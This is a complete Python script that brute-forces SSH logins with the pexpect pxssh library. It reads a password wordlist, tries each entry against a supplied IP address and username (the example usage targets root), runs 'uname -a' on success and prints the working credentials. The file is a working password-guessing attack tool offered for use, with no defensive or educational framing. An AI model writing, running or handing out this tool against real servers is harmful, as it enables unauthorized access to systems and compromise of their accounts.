import sys
import time
from pexpect import pxssh

def ssh_brute(ip, predefined_user, wordlist_path):
    command = 'uname -a'

    try:
        words = open(wordlist_path, "r").readlines()
    except IOError:
        print("\n[-] Error: Check your wordlist path\n")
        sys.exit(1)

    print("\n[+] Loaded:", len(words), "words")
    print("[+] Server:", ip)
    print("[+] User:", predefined_user)
    print("[+] BruteForcing...\n")

    for word in words:
        # Change this time if needed
        time.sleep(0.5)
        if brute(ip, predefined_user, word.replace("\n", ""), command):
            break

def brute(ip, user, word, command):
    print("Trying:", word)
    try:
        s = pxssh.pxssh()
        s.login(ip, user, word, login_timeout=10)
        s.sendline(command)
        s.prompt()
        print("\n", s.before.decode())
        s.logout()
        print("\t[!] Login Success:", user, word, "\n")
        return True
    except Exception as e:
        # print("[-] Failed")
        return False
    except KeyboardInterrupt:
        print("\n[-] Quit\n")
        sys.exit(1)

# Example usage:
# ssh_brute("198.162.1.1", "root", "words.txt")
